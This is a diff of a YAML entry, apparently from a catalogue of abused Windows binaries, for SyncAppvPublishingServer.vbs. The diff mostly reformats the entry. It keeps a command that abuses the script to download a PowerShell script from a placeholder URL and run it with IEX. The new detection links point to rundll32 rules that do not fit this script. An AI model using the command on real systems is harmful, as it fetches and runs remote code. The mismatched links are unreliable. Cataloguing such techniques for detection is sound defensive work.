@@ -1,28 +1,29 @@
----
 Name: Syncappvpublishingserver.vbs
 Description: Script used related to app-v and publishing server
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
-    Description: Inject PowerShell script code with the provided arguments
-    Usecase: Use Powershell host invoked from vbs script
-    Category: Execute
-    Privileges: User
-    MitreID: T1216
-    OperatingSystem: Windows 10
+- Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1')
+    | IEX"
+  Description: Inject PowerShell script code with the provided arguments
+  Usecase: Use Powershell host invoked from vbs script
+  Category: Execute
+  Privileges: User
+  MitreID: T1216
+  OperatingSystem: Windows 10
 Full_Path:
-  - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
+- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
 Code_Sample:
-  - Code:
+- Code: null
 Detection:
-  - Sigma: https://github.com/SigmaHQ/sigma/blob/973e0666acffb8fd7ea8356449eb916381ab0cc6/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml
+- Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_rundll32_activity.yml
+- Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml
+- Splunk: https://research.splunk.com/endpoint/71b9bf37-cde1-45fb-b899-1b0aa6fa1183/
 Resources:
-  - Link: https://twitter.com/monoxgas/status/895045566090010624
-  - Link: https://twitter.com/subTee/status/855738126882316288
+- Link: https://twitter.com/monoxgas/status/895045566090010624
+- Link: https://twitter.com/subTee/status/855738126882316288
 Acknowledgement:
-  - Person: Nick Landers
-    Handle: '@monoxgas'
-  - Person: Casey Smith
-    Handle: '@subtee'
----
+- Person: Nick Landers
+  Handle: '@monoxgas'
+- Person: Casey Smith
+  Handle: '@subtee'
